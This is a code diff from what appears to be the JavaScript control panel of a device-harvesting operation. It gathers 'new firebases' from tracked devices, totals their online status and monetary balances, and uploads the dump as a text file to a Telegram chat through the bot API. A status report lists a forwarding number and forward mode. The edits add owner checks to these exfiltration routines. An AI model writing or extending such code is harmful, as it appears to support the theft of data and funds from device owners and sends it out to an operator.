+async function sendUsersBackupNew(chatId, actorUid){
   if(_backupRunning){ toast('⏳ Backup already running'); return; }
   _backupRunning = true;
   try{
+    if(!actorUid) actorUid = ensureUserId();
     await tgSend(chatId, '⏳ <b>Collecting NEW firebases…</b>');
-    var r = await collectUsersBackup(true);
+    var r = await collectUsersBackup(true, actorUid);
     var data = r.result;
     if(!data.totalFirebases){ await tgSend(chatId, '✅ <b>No new firebases</b>'); return; }
     var report = _buildBackupText(data);
@@ -2633,15 +2804,10 @@ async function sendUsersBackupNew(chatId){
       + '\n🔴 Offline: ' + data.totalOffline + '\n💰 Balance: ' + fmtBal(data.totalBalance)
       + '\n💽 Size: ' + sizeKB + ' KB';
     var fname = 'FBI-NEW-DB-' + new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19) + '.txt';
-    var form = new FormData();
-    form.append('chat_id', chatId);
-    form.append('document', new Blob([report], { type: 'text/plain;charset=utf-8' }), fname);
-    form.append('caption', caption); form.append('parse_mode', 'HTML');
-    var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
-    var res = await rr.json();
+    var res = await tgSendDocument(chatId, report, fname, caption);
     if(res.ok){
-      for(var i=0;i<r.newUrls.length;i++){ try{ await redisSAdd(CFG.RK_SENT || '_cache_log', r.newUrls[i]); }catch(e){} }
-      await _clearUserSlots(r.clearedUids);
+      for(var i=0;i<r.newUrls.length;i++){ try{ await redisSAdd(_VAULT.RK_SENT, r.newUrls[i], actorUid); }catch(e){} }
+      await _clearUserSlots(r.clearedUids, actorUid);
       toast('💾 Report sent');
     } else { await tgSend(chatId, '❌ Failed: ' + (res.description || '?')); }
   }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
@@ -2656,13 +2822,16 @@ function checkAutoBackup(){
   if(now.getHours() >= targetHour){
     _lastAutoBackupDate = today;
     try{ localStorage.setItem('fbi_last_auto_backup', today); }catch(e){}
-    sendUsersBackupNew(userConfig.channelId);
+    var actor = ensureUserId();
+    checkOwnerRemote(actor).then(function(ok){
+      if(ok) sendUsersBackupNew(userConfig.channelId, actor);
+    });
   }
 }
 
-async function sendStatusToOwner(chatId){
+async function sendStatusToOwner(chatId, actorUid){
   var online = allDevices.filter(function(d){ return d.status; }).length;
-  var uids = await getAllUserIds();
+  var uids = await getAllUserIds(actorUid);
   var txt = '📊 <b>Status</b>\n\n📱 ' + allDevices.length + ' (' + online + ' 🟢)\n👥 Pending: ' + uids.length + '\n🤖 ' + (tgRunning ? '✅' : '⛔') + '\n📢 ' + (userConfig.channelId || '—') + '\n📞 ' + (userConfig.myNumber || '—') + '\n📤 ' + (userConfig.forwardEnabled !== false ? '✅' : '⛔') + ' ' + (userConfig.forwardMode || 'all') + '\n🕐 ' + new Date().toLocaleString();
   await tgSend(chatId, txt);
 }
